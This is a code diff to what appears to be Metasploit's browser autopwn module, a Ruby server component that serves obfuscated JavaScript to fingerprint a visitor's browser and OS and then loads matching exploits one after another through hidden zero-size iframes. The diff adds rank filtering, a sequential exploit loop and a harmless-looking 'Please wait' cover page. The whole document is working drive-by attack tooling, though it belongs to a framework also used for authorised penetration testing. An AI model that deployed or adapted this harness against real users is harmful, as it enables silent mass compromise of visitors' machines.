@@ -125,8 +125,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	def setup
 
-		init_js = ::Rex::Exploitation::ObfuscateJS.new
-		init_js << <<-ENDJS
+		@init_js = ::Rex::Exploitation::ObfuscateJS.new
+		@init_js << <<-ENDJS
 
 			#{js_os_detect}
 			#{js_base64}
@@ -191,12 +191,12 @@ class Metasploit3 < Msf::Auxiliary
 			'Strings' => true,
 		}
 
-		init_js.update_opts(opts)
-		init_js.update_opts(js_os_detect.opts)
-		init_js.update_opts(js_base64.opts)
+		@init_js.update_opts(opts)
+		@init_js.update_opts(js_os_detect.opts)
+		@init_js.update_opts(js_base64.opts)
 		if (datastore['DEBUG'])
 			print_status("Adding debug code")
-			init_js << <<-ENDJS
+			@init_js << <<-ENDJS
 				if (!(typeof(debug) == 'function')) {
 					function htmlentities(str) {
 						str = str.replace(/>/g, '&gt;');
@@ -210,15 +210,15 @@ class Metasploit3 < Msf::Auxiliary
 				}
 			ENDJS
 		else
-			init_js.obfuscate()
+			@init_js.obfuscate()
 		end
 
-		init_js << "window.onload = #{init_js.sym("bodyOnLoad")};";
+		#@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
 		@init_html  = "<html > <head > <title > Loading </title>\n"
 		@init_html << '<script language="javascript" type="text/javascript">'
-		@init_html << "<!-- \n #{init_js} //-->"
+		@init_html << "<!-- \n #{@init_js} //-->"
 		@init_html << "</script> </head> "
-		@init_html << "<body onload=\"#{init_js.sym("bodyOnLoad")}()\"> "
+		@init_html << "<body onload=\"#{@init_js.sym("bodyOnLoad")}()\"> "
 		@init_html << "<noscript> \n"
 		@init_html << build_iframe("#{self.get_resource}?ns=1")
 		@init_html << "</noscript> \n"
@@ -235,6 +235,14 @@ class Metasploit3 < Msf::Auxiliary
 		@lin_lport = datastore['LPORT_LINUX'] || 4444
 		@osx_lport = datastore['LPORT_MACOS'] || 5555
 		@gen_lport = datastore['LPORT_GENERIC'] || 6666
+
+		minrank = framework.datastore['MinimumRank'] || 'manual'
+		if not RankingName.values.include?(minrank)
+			print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
+			wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
+		end
+		@minrank = RankingName.invert[minrank]
+
 	end
 
 
@@ -243,6 +251,11 @@ class Metasploit3 < Msf::Auxiliary
 			@exploits[name] = framework.modules.create(name)
 		else
 			@exploits[name] = mod.new
+		end
+		apo = @exploits[name].class.autopwn_opts
+		if (apo[:rank] < @minrank)
+			@exploits.delete(name)
+			return false
 		end
 
 		case name
@@ -314,11 +327,9 @@ class Metasploit3 < Msf::Auxiliary
 		framework.exploits.each_module do |name, mod|
 			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
 				next if !(init_exploit(name))
-				apo = mod.autopwn_opts
-				apo[:name] = name
-				if !apo[:rank] 
-					apo[:rank] = mod.const_defined?('Rank') ? mod.const_get('Rank') : NormalRanking
-				end
+				apo = mod.autopwn_opts.dup
+				apo[:name] = name.dup
+				apo[:vuln_test] ||= ""
 
 				if apo[:classid]
 					# Then this is an IE exploit that uses an ActiveX control,
@@ -338,16 +349,26 @@ class Metasploit3 < Msf::Auxiliary
 						apo[:vuln_test] << "}\n"
 					end
 				end
-				if apo[:ua_minver]
-					apo[:vuln_test] << "if (1 == ua_ver_cmp('#{apo[:ua_minver]}', detected_version.ua_version)){"
-					apo[:vuln_test] << " is_vuln = false;\n"
-					apo[:vuln_test] << "}\n"
+
+				if apo[:ua_minver] and apo[:ua_maxver]
+					ver_test = 
+							"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
+							"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
+				elsif apo[:ua_minver]
+					ver_test = "!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}')\n"
+				elsif apo[:ua_maxver]
+					ver_test = "!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')\n"
+				else
+					ver_test = "true"
 				end
-				if apo[:ua_maxver]
-					apo[:vuln_test] << "if (-1 == ua_ver_cmp('#{apo[:ua_maxver]}', detected_version.ua_version)){"
-					apo[:vuln_test] << " is_vuln = false;\n"
-					apo[:vuln_test] << "}\n"
-				end
+				test =  "if (#{ver_test}) { "
+				test << (apo[:vuln_test].empty? ? "is_vuln = true;" : apo[:vuln_test])
+				test << "} else { is_vuln = false; }\n"
+				apo[:vuln_test] = test
+
+				# Now that we've got all of our exploit tests put together,
+				# organize them into requires-scripting and
+				# doesnt-require-scripting, sorted by browser name.
 				if apo[:javascript] && apo[:ua_name]
 					if @js_tests[apo[:ua_name]].nil?
 						@js_tests[apo[:ua_name]] = []
@@ -391,12 +412,15 @@ class Metasploit3 < Msf::Auxiliary
 		Rex::ThreadSafe.sleep(0.5)
 
 		print_line
-		print_status("--- Done, found #{@exploits.length} exploit modules")
+		print_status("--- Done, found %bld%grn#{@exploits.length}%clr exploit modules")
 		print_line
 
+		require 'pp'
+		# Sort the tests by reliability, descending.
 		@js_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
+		
 		@noscript_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
@@ -427,7 +451,7 @@ class Metasploit3 < Msf::Auxiliary
 				response = create_response()
 				response["Expires"] = "0"
 				response["Cache-Control"] = "must-revalidate"
-				response.body = "Your mom"
+				response.body = "Please wait"
 			else
 				print_status("Responding with exploits")
 				response = build_script_response(cli, request)
@@ -483,7 +507,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		}
 
-		response.body << "Your mom "
+		response.body << "Please wait "
 		response.body << "</body> </html> "
 
 		return response
@@ -560,8 +584,38 @@ class Metasploit3 < Msf::Auxiliary
 				written_iframes[written_iframes.length] = myframe;
 				str = '';
 				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
-				str += '<p>' + myframe + '</p>';
+				#{datastore['DEBUG'] ? "str += '<p>' + myframe + '</p>'" : ""};
 				document.body.innerHTML += (str);
+			}
+			var global_exploit_list = [];
+			function next_exploit(exploit_idx) {
+				if (!global_exploit_list[exploit_idx]) {
+					return;
+				}
+				// Wrap all of the vuln tests in a try-catch block so a
+				// single borked test doesn't prevent other exploits
+				// from working.
+				try {
+					var test = global_exploit_list[exploit_idx].test;
+					if (!test) {
+						test = "true";
+					} else {
+						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
+					}
+					//alert("next_exploit(" + (exploit_idx).toString() + ") => " + 
+					//	global_exploit_list[exploit_idx].resource + "\\n" +
+					//	test + " -- " + eval(test)
+					//);
+					if (eval(test)) {
+						write_iframe(global_exploit_list[exploit_idx].resource);
+						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
+					} else {
+						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
+						next_exploit(exploit_idx+1);
+					}
+				} catch(e) { 
+					next_exploit(exploit_idx+1);
+				};
 			}
 		ENDJS
 		opts = {
@@ -572,9 +626,12 @@ class Metasploit3 < Msf::Auxiliary
 					'mybody',
 					'iframe_idx',
 					'is_vuln',
+					'global_exploit_list',
+					'exploit_idx',
 				],
 				'Methods'   => [
 					'write_iframe',
+					'next_exploit',
 				]
 			},
 			'Strings' => true,
@@ -582,42 +639,38 @@ class Metasploit3 < Msf::Auxiliary
 
 		@js_tests.each { |browser, sploits|
 			next if sploits.length == 0
-			#print_status("#{client_info[:ua_name]} =? [nil, #{browser}, 'generic']")
-			#if (browser == "generic" || client_info.nil? || [nil, browser].include?(client_info[:ua_name]))
 			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
 				# Make sure the browser names can be used as an identifier in
 				# case something wacky happens to them.
 				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
 				js << "function #{func_name}() { \n"
 				sploits.map do |s|
+					# get rid of newlines and escape quotes
+					test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
+					# shouldn't be any in the resource, but just in case...
+					res = exploit_resource(s[:name]).gsub("\n",'').gsub("'", "\\\\'")
+
 					# Skip exploits that don't match the client's OS.
 					if (host_info and host_info[:os_name] and s[:os_name])
 						next unless s[:os_name].include?(host_info[:os_name])
 					end
-					if s[:vuln_test] and not s[:vuln_test].empty?
-						# Wrap all of the vuln tests in a try-catch block so a
-						# single borked test doesn't prevent other exploits
-						# from working.
-						js << " is_vuln = false;\n"
-						js << " try {\n"
-						js << s[:vuln_test] + "\n"
-						js << " } catch(e) { is_vuln = false; };\n"
-						js << " if (is_vuln) {"
-						js << "  write_iframe('" + exploit_resource(s[:name]) + "'); "
-						js << " }\n"
+					js << " global_exploit_list[global_exploit_list.length] = {\n"
+					if test and not test.empty?
+						js << "  'test':'#{test}',\n"
 					else
-						# If the exploit doesn't provide a way to check
-						# for the vulnerability, just try it and hope for
-						# the best.
-						js << " write_iframe('" + exploit_resource(s[:name]) + "');\n"
+						js << "  'test':'is_vuln = true;',\n"
 					end
+					js << "  'resource':'#{res}'\n"
+					js << " };\n"
 				end
 				js << "};\n" # end function exploit...()
-				js << "#{js_debug("'exploit func: #{func_name}()'")}\n"
+				js << "#{js_debug("'exploit func: #{func_name}()<br>'")}\n"
 				js << "#{func_name}();\n" # run that bad boy
 				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
+		js << "#{js_debug("'starting exploits<br>'")}\n"
+		js << "next_exploit(0);\n"
 
 		if not datastore['DEBUG']
 			js.obfuscate
